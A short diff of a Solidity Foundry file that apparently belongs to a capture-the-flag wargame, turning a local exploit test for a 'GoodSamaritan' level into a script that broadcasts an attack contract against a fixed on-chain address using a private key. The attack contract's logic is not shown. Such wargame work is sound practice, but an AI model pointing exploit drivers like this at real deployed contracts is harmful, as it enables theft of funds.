@@ -2,18 +2,17 @@
 
 pragma solidity ^0.8.0;
 
-import "../instance/Level29.sol";
-import "forge-std/Test.sol";
+import "../instance/Level27.sol";
+import "forge-std/Script.sol";
 
-contract ExploitLevel29 is Test {
-    GoodSamaritan instance = new GoodSamaritan();
-    address attacker = vm.addr(1);
+contract ExploitLevel27 is Script {
+    GoodSamaritan instance = GoodSamaritan(0xA067749E8eFA200A7c952A8cdA61a7b2C0b140AA);
 
-    function testExploit() external {
-        vm.startPrank(attacker);
+    function run() external {
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
         AttackInstance attackContract = new AttackInstance();
         attackContract.attack(instance);
-        vm.stopPrank();
+        vm.stopBroadcast();
     }
 }
 
